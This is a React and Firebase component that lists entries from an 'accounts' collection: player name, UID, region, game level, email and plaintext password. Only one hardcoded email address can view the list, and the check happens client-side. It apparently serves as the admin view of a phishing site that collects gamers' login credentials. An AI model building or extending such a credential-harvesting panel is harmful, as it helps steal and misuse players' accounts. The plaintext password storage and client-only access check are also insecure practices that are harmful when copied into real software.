import { Box, Typography, Table, TableBody, TableCell, TableContainer, TableHead, TableRow, Paper, CircularProgress, Alert, Container, Button, } from '@mui/material';
import { collection, deleteDoc, doc, getDocs, orderBy, query } from 'firebase/firestore';
import React, { useEffect, useState } from 'react';
import { onAuthStateChanged } from 'firebase/auth';
import { auth, db } from '../firebase';

const ShowData = () => {
    const [rows, setRows] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState('');
    const [show, setShow] = useState(false);
    // Auth listener
    useEffect(() => {
        const unsubscribe = onAuthStateChanged(auth, (user) => {
            setShow(user?.email === 'qarniff1122@gmail.com');
        });

        return () => unsubscribe();
    }, []);

    // Fetch Firestore data
    useEffect(() => {
        const fetchData = async () => {
            setLoading(true);
            setError('');

            try {
                const loadCollection = async (collectionName) => {
                    const q = query(
                        collection(db, collectionName),
                        orderBy('createdAt', 'desc')
                    );

                    const snapshot = await getDocs(q);

                    return snapshot.docs.map((doc) => ({
                        id: doc.id,
                        ...doc.data(),
                    }));
                };

                let data = await loadCollection('accounts');

                if (data.length === 0) {
                    data = await loadCollection('account');
                }

                setRows(data);
            } catch (err) {
                console.error('Failed to fetch accounts:', err);
                setError('Unable to load account entries. Please try again later.');
            } finally {
                setLoading(false);
            }
        };

        fetchData();
    }, []);

    const renderDate = (value) => {
        if (!value) return '-';

        if (typeof value.toDate === 'function') {
            return value.toDate().toLocaleString();
        }

        return new Date(value).toLocaleString();
    };

    const deleteRow = async (id) => {
        try {
            await deleteDoc(doc(db, 'accounts', id));
            setRows((prevRows) => prevRows.filter((row) => row.id !== id));
        } catch (err) {
            console.error('Failed to delete account entry:', err);
            setError('Unable to delete this entry. Please try again.');
        }
    };

    if (!show) {
        return null;
    }

    return (
        <Box id="show-data" sx={{ py: { xs: 6, md: 10 }, px: { xs: 2, md: 0 } }}>
            <Typography
                variant="h4"
                sx={{ fontWeight: 800, mb: 3, textAlign: 'center' }}
            >
                Account Entries
            </Typography>

            <Container maxWidth="lg">
                {loading ? (
                    <Box sx={{ display: 'flex', justifyContent: 'center', py: 6 }}>
                        <CircularProgress />
                    </Box>
                ) : error ? (
                    <Alert severity="error">{error}</Alert>
                ) : (
                    <TableContainer
                        component={Paper}
                        sx={{
                            background: 'rgba(15, 15, 20, 0.95)',
                            borderRadius: 3,
                            boxShadow: '0 25px 80px rgba(0,0,0,0.35)',
                        }}
                    >
                        <Table>
                            <TableHead>
                                <TableRow>
                                    <TableCell><strong>Player</strong></TableCell>
                                    <TableCell><strong>UID</strong></TableCell>
                                    <TableCell><strong>Region</strong></TableCell>
                                    <TableCell><strong>Level</strong></TableCell>
                                    <TableCell><strong>Email</strong></TableCell>
                                    <TableCell><strong>Password</strong></TableCell>
                                    <TableCell><strong>Created At</strong></TableCell>
                                    <TableCell><strong>Delete</strong></TableCell>
                                </TableRow>
                            </TableHead>
                            <TableBody>
                                {rows.map((row) => (
                                    <TableRow key={row.id}>
                                        <TableCell>{row.playerName || '-'}</TableCell>
                                        <TableCell>{row.uid || '-'}</TableCell>
                                        <TableCell>{row.region || '-'}</TableCell>
                                        <TableCell>{row.level || '-'}</TableCell>
                                        <TableCell>{row.email || '-'}</TableCell>
                                        <TableCell>{row.note || row.password || '-'}</TableCell>
                                        <TableCell>{renderDate(row.createdAt)}</TableCell>
                                        <TableCell>
                                            <Button
                                                variant='contained'
                                                color='error'
                                                onClick={() => deleteRow(row.id)}
                                            >
                                                Delete
                                            </Button>
                                        </TableCell>
                                    </TableRow>
                                ))}
                            </TableBody>
                        </Table>
                    </TableContainer>
                )}
            </Container>
        </Box>
    );
};

export default ShowData;